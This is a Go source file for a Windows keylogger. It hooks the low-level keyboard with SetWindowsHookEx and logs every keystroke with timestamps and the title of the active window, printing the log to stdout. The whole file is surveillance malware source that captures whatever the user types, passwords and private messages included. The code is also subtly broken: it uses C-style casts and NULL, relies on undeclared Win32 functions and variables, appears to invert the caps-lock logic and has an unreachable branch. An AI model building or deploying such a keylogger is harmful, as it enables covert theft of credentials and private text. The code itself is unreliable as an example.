package main

import (
	"bytes"
	"fmt"
	"strconv"
	"time"
	"unsafe"
)

var lastWindow string

func main() {

	go StartHook()

	var msg MSG
	for {
		GetMessage(&msg, NULL, 0, 0)
	}
}

func StartHook() {
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		(HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
			if nCode == 0 && wparam == WM_KEYDOWN {
				kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
				code := byte(kbdstruct.VkCode)
				processKey(code)
			}
			return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
		}), 0, 0)

	var msg MSG
	for GetMessage(&msg, 0, 0, 0) != 0 {

	}

	UnhookWindowsHookEx(keyboardHook)
	keyboardHook = 0
}

func processKey(key_stroke byte) {
	if (key_stroke == 1) || (key_stroke == 2) {
		return // ignore mouse clicks
	}

	var buffer bytes.Buffer

	foreground := GetForegroundWindow()
	windowText := GetWindowText(HWND(foreground))
	if lastWindow != windowText {
		lastWindow = windowText
		buffer.WriteString("[Window: ")
		buffer.WriteString(lastWindow)
		buffer.WriteString(" - at ")
		buffer.WriteString(time.Now().UTC().String())
		buffer.WriteString("]\n")
	}

	buffer.WriteString("[")
	buffer.WriteString(time.Now().UTC().String())
	buffer.WriteString("]\t")
	if key_stroke == VK_BACK {
		buffer.WriteString("[BACKSPACE]")
	} else if key_stroke == VK_RETURN {
		buffer.WriteString("\n")
	} else if key_stroke == VK_SPACE {
		buffer.WriteString(" ")
	} else if key_stroke == VK_TAB {
		buffer.WriteString("[TAB]")
	} else if key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT {
		buffer.WriteString("[SHIFT]")
	} else if key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL {
		buffer.WriteString("[CONTROL]")
	} else if key_stroke == VK_ESCAPE {
		buffer.WriteString("[ESCAPE]")
	} else if key_stroke == VK_END {
		buffer.WriteString("[END]")
	} else if key_stroke == VK_HOME {
		buffer.WriteString("[HOME]")
	} else if key_stroke == VK_LEFT {
		buffer.WriteString("[LEFT]")
	} else if key_stroke == VK_UP {
		buffer.WriteString("[UP]")
	} else if key_stroke == VK_RIGHT {
		buffer.WriteString("[RIGHT]")
	} else if key_stroke == VK_DOWN {
		buffer.WriteString("[DOWN]")
	} else if key_stroke == 190 || key_stroke == 110 {
		buffer.WriteString(".")
	} else if key_stroke == 189 || key_stroke == 109 {
		buffer.WriteString("-")
	} else if key_stroke == 20 {
		buffer.WriteString("[CAPSLOCK]")
	} else if key_stroke >= 48 && key_stroke <= 57 {
		// numeric, 48 = 0, 49 = 1, ...
		buffer.WriteString(strconv.Itoa(int(key_stroke) - 48))
	} else if key_stroke >= 96 && key_stroke <= 105 {
		// numeric numpad, 96 = 0, 97 = 1, ...
		buffer.WriteString("numpad ")
		buffer.WriteString(strconv.Itoa(int(key_stroke) - 96))
	} else {
		if key_stroke >= 96 && key_stroke <= 105 {
			key_stroke -= 48;
		} else if key_stroke >= 65 && key_stroke <= 90 { // A-Z
			// check caps lock
			lowercase := (GetKeyState(VK_CAPITAL) & 0x0001) != 0
			if (GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0 {
				lowercase = !lowercase
			}

			if lowercase {
				key_stroke += 32
			}

			buffer.WriteString(string(key_stroke))
		}
	}

	fmt.Println(buffer.String())
}